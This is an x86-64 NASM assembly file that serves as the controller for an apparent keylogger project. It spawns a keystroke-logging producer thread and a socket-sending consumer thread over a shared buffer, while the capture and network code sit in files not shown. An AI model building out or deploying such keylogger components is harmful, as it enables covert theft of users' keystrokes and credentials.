; main.asm - THREAD MANAGER / SHARED MEMORY SETUP
; Author: Samuel Gould
; Date: 2026-03-23
; Description:
;   NASM Linux x86-64 threaded controller
;   - Creates shared memory buffer for inter-thread communication
;   - Spawns keylogger (writer) and socket (reader) threads using clone
;   - Maintains execution loop to keep process alive
; Notes:
;   - Shared memory exists in .bss (write_pos, read_pos, buffer)
;   - Threads share memory space (CLONE_VM)
;   - No locks required (single producer, single consumer)
;
; THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY
; DO NOT USE ON SYSTEMS WITHOUT EXPLICIT PERMISSION

%include "common.inc"
global write_pos 
global read_pos
global buffer 
global socket_connected
global keylogger_done 
global socket_done 
extern write_thread 
extern read_thread

; - - - UNINITIALIZED DATA - - -
section .bss

  socket_connected resb 1
  keylogger_done resb 1
  socket_done resb 1

  write_pos resq 1
  read_pos resq 1
  buffer resb BUFFER_SIZE

  ; Thread stacks
  keylogger_stack resb STACK_SIZE
  socket_stack resb STACK_SIZE

  ; timespec struct for nanosleep
  ts_sec resq 1
  ts_nsec resq 1

; - - - CODE - - -
section .text
global _start

_start:

  call init
  call thread_start
  call main_loop

; Initialize shared memory
init:
  mov qword [write_pos], 0
  mov qword [read_pos], 0
  mov byte [socket_connected], 0 
  mov byte [keylogger_done], 0 
  mov byte [socket_done], 0 
  ret

; Spawn worker threads
thread_start:
  
  ; Create socket (consumer)
  CREATE_THREAD socket_stack, read_thread

  .wait_socket:
    cmp byte [socket_connected], 1
    jne .wait_socket 
  
  ; Create keylogger (producer)
  CREATE_THREAD keylogger_stack, write_thread

  ret

; Keep main thread alive indefinitely
main_loop:
  cmp byte [keylogger_done], 1
  je cleanup 
  cmp byte [socket_done], 1
  je cleanup 
  jmp main_loop

; Fallback exit (should never hit)
cleanup:
  EXIT 0
